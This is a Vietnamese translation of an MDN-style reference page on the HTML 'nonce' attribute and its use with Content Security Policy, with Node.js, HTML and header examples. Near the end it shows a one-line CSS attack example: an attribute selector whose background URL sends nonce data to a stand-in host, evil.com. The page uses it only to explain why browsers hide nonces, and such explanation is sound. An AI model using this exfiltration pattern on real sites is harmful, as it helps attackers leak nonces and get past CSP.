---
title: HTML nonce global attribute
short-title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
page-type: html-attribute
browser-compat: html.global_attributes.nonce
sidebar: htmlsidebar
---

Thuộc tính [toàn cục](/en-US/docs/Web/HTML/Reference/Global_attributes) **`nonce`**
là thuộc tính nội dung định nghĩa một {{Glossary("Nonce", "nonce")}} mật mã ("số sử dụng một lần") có thể được sử dụng bởi
[Content Security Policy](/en-US/docs/Web/HTTP/Guides/CSP) để xác định liệu một yêu cầu tải nhất định có được phép tiến hành hay không cho một phần tử nhất định.

## Mô tả

Thuộc tính `nonce` hữu ích để cho phép danh sách trắng các phần tử cụ thể, chẳng hạn như một phần tử script hoặc style nội tuyến cụ thể.
Nó có thể giúp bạn tránh sử dụng chỉ thị `unsafe-inline` của [CSP](/en-US/docs/Web/HTTP/Guides/CSP), vốn sẽ cho phép danh sách trắng _tất cả_ các script hoặc style nội tuyến.

> [!NOTE]
> Chỉ sử dụng `nonce` cho các trường hợp bạn không có cách nào tránh sử dụng nội dung script
> hoặc style nội tuyến không an toàn. Nếu bạn không cần `nonce`, đừng sử dụng nó. Nếu script của bạn là tĩnh, bạn cũng có thể sử dụng hash CSP thay thế.
> (Xem ghi chú sử dụng trên [script nội tuyến không an toàn](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Luôn cố gắng tận dụng tối đa các biện pháp bảo vệ của [CSP](/en-US/docs/Web/HTTP/Guides/CSP) và tránh nonces hoặc các script nội tuyến không an toàn bất cứ khi nào có thể.

### Sử dụng nonce để cho phép danh sách trắng phần tử \<script>

Có một vài bước liên quan để cho phép danh sách trắng một script nội tuyến bằng cơ chế nonce:

#### Tạo giá trị

Từ máy chủ web của bạn, hãy tạo một chuỗi được mã hóa base64 ngẫu nhiên có ít nhất 128 bit dữ liệu từ một bộ tạo số ngẫu nhiên an toàn về mặt mật mã. Nonces nên được tạo khác nhau mỗi lần trang tải (nonce chỉ một lần!). Ví dụ, trong nodejs:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Cho phép danh sách trắng script nội tuyến

Nonce được tạo trong mã backend của bạn bây giờ nên được sử dụng cho script nội tuyến mà bạn muốn cho phép danh sách trắng:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Gửi nonce với header CSP

Cuối cùng, bạn sẽ cần gửi giá trị nonce trong header
[`Content-Security-Policy`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)
(thêm tiền tố `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Truy cập nonces và ẩn nonce

Vì lý do bảo mật, thuộc tính nội dung `nonce` bị ẩn (một chuỗi rỗng sẽ được trả về).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Thuộc tính [`nonce`](/en-US/docs/Web/API/HTMLElement/nonce) là cách duy nhất để truy cập nonces:

```js example-good
script.nonce; // returns nonce value
```

Việc ẩn nonce giúp ngăn kẻ tấn công lấy dữ liệu nonce qua các cơ chế có thể lấy dữ liệu từ các thuộc tính nội dung như thế này:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Đặc tả

{{Specifications}}

## Tương thích trình duyệt

{{Compat}}

## Xem thêm

- [`HTMLElement.nonce`](/en-US/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/en-US/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
